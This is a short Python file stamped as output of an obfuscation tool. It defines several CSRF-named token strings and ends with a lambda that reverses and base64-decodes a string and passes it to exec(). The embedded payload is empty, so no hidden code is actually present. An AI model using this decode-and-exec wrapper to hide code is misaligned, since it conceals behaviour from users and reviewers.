# Obfuscated By Axak 
# https://www.github.com/PaNdAxAk 
# Time : Sat Sep 17 11:12:47 2022 
percsrf="3a8ce2b641"
okpcsrf="efcad306ff"
khcsrf="5df587b221"
shecsrf="qLV6YHkg7BDlcNhBNjRG3uRolS7EmTvUN76FZ6mG6pHeGiAt8pKtDBsYZF0a"

_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'='))
